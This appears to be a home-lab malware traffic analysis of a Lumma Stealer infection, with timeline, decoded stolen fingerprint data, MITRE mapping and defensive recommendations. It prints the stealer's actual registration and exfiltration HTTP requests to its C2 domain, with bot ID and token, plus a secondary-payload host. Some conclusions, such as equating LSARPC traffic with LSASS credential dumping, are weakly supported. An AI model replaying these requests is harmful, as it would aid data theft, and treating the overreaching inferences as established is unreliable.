# Malware Traffic Analysis: Lumma Stealer
## PCAP File: 2026-01-31-traffic-analysis-exercise.pcap
## Author: Lalith Vardhan Boddala
## Date: 2026-01-31 | Analysed: 2026-06-20

---

## Executive Summary

Analysis of a real-world Lumma Stealer infection captured in a PCAP
exercise from malware-traffic-analysis.net. The malware successfully
registered a victim Windows 10 machine with its C2 panel at
`whitepepper.su` and exfiltrated a comprehensive browser fingerprint
including hardware specs, GPU info, installed fonts, screen resolution,
audio context, and canvas fingerprint — all transmitted in plaintext
over HTTP.

A secondary payload delivery from `172.56.88.98` was attempted but
failed — the archive referenced in the C2 response was never downloaded.

---

## 1. PCAP Overview

| Field | Value |
|---|---|
| File | 2026-01-31-traffic-analysis-exercise.pcap |
| Total Packets | 51,181 |
| Protocols | Ethernet, IPv4, TCP, UDP, HTTP, NetBIOS, DCE/RPC, LSARPC |
| Victim IP | 10.1.21.58 |
| Victim Hostname | 54ce0109-19b4-4b2a-9869-ad2fdcaf34cb.local |
| Victim OS | Windows 10 x64 |
| Victim Browser | Chrome 144.0.0.0 |
| Victim GPU | AMD Radeon R9 200 Series |
| C2 Domain | whitepepper.su |
| C2 Port | 80 (HTTP — plaintext) |
| Secondary C2 | 172.56.88.98 (attempted — failed) |
| Malware Family | Lumma Stealer |

---

## 2. Protocol Hierarchy Analysis

| Protocol | Significance |
|---|---|
| HTTP | C2 communication — agent registration and data exfil |
| NetBIOS Datagram | Windows name resolution — internal network enumeration |
| NetBIOS Session Service | SMB session establishment |
| DCE/RPC | Remote procedure calls — credential access activity |
| LSARPC | Local Security Authority — credential dumping indicator |

**Key Finding:** The presence of DCE/RPC and LSARPC alongside HTTP C2
traffic indicates Lumma Stealer attempted credential harvesting from the
Windows Local Security Authority in addition to browser fingerprinting.

---

## 3. Attack Timeline

| Time (relative) | Packet | Event |
|---|---|---|
| 0.000s | 1 | Capture begins |
| 2.35s | 72 | Windows connectivity check (msftconnecttest.com) |
| 2.40s | 74 | Internet confirmed — machine is online |
| 94.6s | 23861 | Chrome opens — time sync with clients2.google.com |
| 95.3s | 24500 | FIRST C2 contact — whitepepper.su |
| Before 24500 | <24500 | Initial HTTP activity — infection vector |
| 95.344s | 24500 | GET /api/set_agent — C2 registration |
| 96.287s | 24601 | POST /api/set_agent — fingerprint exfiltration (8,023 bytes) |
| 96.485s | 24614 | GET /favicon.ico — C2 panel resource |
| 103.190s | 25270 | GET /api/set_agent — second registration attempt |
| 103.554s | 25286 | POST /api/set_agent — second exfiltration (7,975 bytes) |
| 103.780s | 25298 | GET /favicon.ico — C2 panel resource |

---

## 4. C2 Communication Analysis

### 4.1 Agent Registration (GET Request)
```
GET /api/set_agent?id=3BF67EC05320C5729578BE4C0ADF174C
    &token=842e2802df0f0a06b4ed51f12f4387e761523b
    &description=
    &agent=Chrome HTTP/1.1
Host: whitepepper.su
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
            Chrome/144.0.0.0 Safari/537.36
```

**Analysis:** Lumma registers the infected machine with a unique bot ID
(`3BF67EC05320C5729578BE4C0ADF174C`) and authentication token. The
`agent=Chrome` parameter identifies the browser being abused for the
fingerprint collection. The malware masquerades as a legitimate Chrome
browser request.

### 4.2 C2 Server Response — JavaScript Payload
The C2 server responded with an HTML page containing JavaScript that:
- Collected complete browser and system fingerprint
- Used WebGL to fingerprint the GPU
- Generated a canvas fingerprint (unique per device)
- Detected WebRTC configuration
- Enumerated installed browser plugins
- Checked network connection quality
- Collected screen dimensions and color depth
- Detected audio context capabilities
- Checked for WebDriver (anti-sandbox evasion)

### 4.3 Data Exfiltration (POST Request)
```
POST /api/set_agent?id=3BF67EC05320C5729578BE4C0ADF174C
     &token=842e2802df0f0a06b4ed51f12f4387e761523b
     &act=log HTTP/1.1
Host: whitepepper.su
Content-Type: application/x-www-form-urlencoded
Content-Length: 8023
```

**Exfiltrated Data Decoded:**

| Category | Stolen Value |
|---|---|
| Platform | Win32 |
| OS | Windows NT 10.0 x64 |
| Browser | Chrome 144.0.0.0 |
| CPU Cores | 12 |
| Screen | 1920x1080, 24-bit color |
| GPU Vendor | AMD (Google Inc.) |
| GPU Model | AMD Radeon R9 200 Series (0x0000679A) |
| GPU API | Direct3D11 via ANGLE |
| Network | 4G, RTT 100ms, 1.55 Mbps downlink |
| Audio | 48000Hz sample rate, stereo |
| Canvas | Unique base64 PNG fingerprint |
| Fonts | Arial, Georgia, Times New Roman, Verdana + 10 others |
| Language | en-US |
| Cookies | Enabled |
| Java | Disabled |
| PDF Viewer | Enabled |
| WebDriver | False (not sandboxed) |

**Total exfiltration size:** 8,023 bytes (first POST) + 7,975 bytes
(second POST) = **15,998 bytes of victim data sent to C2**

---

## 5. Secondary Payload Delivery — Failed Attempt

The C2 response referenced:
```
cant open archive 172.56.88.98-038485b1855ec7a1ba5bbda042ad17a1.zip
```

**Analysis:** The C2 panel attempted to serve a secondary payload
(likely Lumma Stealer's main credential harvesting module) from
`172.56.88.98`. However:
- Filter `ip.addr == 172.56.88.98` returned **no results**
- No TLS traffic to that IP was found
- The archive was never downloaded

**Conclusion:** Secondary payload delivery failed — possibly due to
the payload server being offline at time of capture, or a network
control blocking the connection.

**Significance:** This demonstrates that Lumma Stealer uses a
two-stage delivery — initial fingerprinting via `whitepepper.su`,
followed by targeted payload delivery from a separate infrastructure.

---

## 6. Credential Access Activity

The presence of **LSARPC** and **DCE/RPC** traffic indicates
Lumma Stealer attempted to access the Windows Local Security
Authority (LSA) — the system component responsible for storing
credentials.

```
Filters confirmed:
- dcerpc traffic present
- lsarpc traffic present
```

**MITRE Mapping:** T1003.001 — OS Credential Dumping: LSASS Memory

---

## 7. Network Conversations Analysis

Victim IP `10.1.21.58` contacted multiple external IPs. The
conversations view showed traffic to:
- `whitepepper.su` — primary C2 (HTTP port 80)
- `www.msftconnecttest.com` — Windows connectivity check (legitimate)
- `clients2.google.com` — Chrome update/connectivity check (legitimate)
- Multiple Microsoft CDN IPs — Windows telemetry (legitimate)

**Key Observation:** Lumma Stealer blends its C2 traffic among
legitimate Windows and browser traffic — making detection harder
without domain-based filtering.

---

## 8. Anti-Analysis Techniques Observed

| Technique | Evidence |
|---|---|
| Legitimate browser User-Agent | Masquerades as Chrome 144 |
| HTTP over port 80 | Blends with normal web traffic |
| .su TLD abuse | Soviet Union TLD — common cybercriminal choice |
| WebDriver detection | Checks if running in automated sandbox |
| Two-stage delivery | Fingerprint first, payload second |
| nginx C2 panel | Professional C2 infrastructure |

---

## 9. MITRE ATT&CK Mapping

| Technique | ID | Evidence |
|---|---|---|
| Drive-by Compromise | T1189 | Initial HTTP infection vector |
| Ingress Tool Transfer | T1105 | Secondary payload attempted from 172.56.88.98 |
| System Information Discovery | T1082 | OS, CPU, GPU, screen data collected |
| Browser Information Discovery | T1217 | Chrome version, plugins, extensions enumerated |
| OS Credential Dumping: LSASS | T1003.001 | LSARPC + DCE/RPC traffic |
| Exfiltration Over HTTP | T1041 | 15,998 bytes POSTed to whitepepper.su |
| Masquerading | T1036 | Chrome User-Agent used to blend in |

---

## 10. Analyst Recommendations

| Priority | Control | Rationale |
|---|---|---|
| Critical | Block .su TLD at DNS gateway | Soviet Union TLD heavily abused by criminals |
| Critical | Deploy DNS filtering (Cisco Umbrella / Pi-hole) | Would have blocked whitepepper.su lookup |
| High | Enable HTTPS inspection at proxy | HTTP C2 would be trivially detected |
| High | Block outbound HTTP (port 80) from workstations | No legitimate business need for plain HTTP |
| High | Monitor for LSARPC calls | Credential dumping indicator |
| Medium | Deploy EDR with memory protection | Prevents LSASS access |
| Medium | Alert on large outbound POST requests | 8KB POST to unknown domain is anomalous |

---

*Lalith Vardhan Boddala | SOC Home Lab Portfolio*
*GitHub: https://github.com/lalithvardhan434*
*Source PCAP: malware-traffic-analysis.net — 2026-01-31*
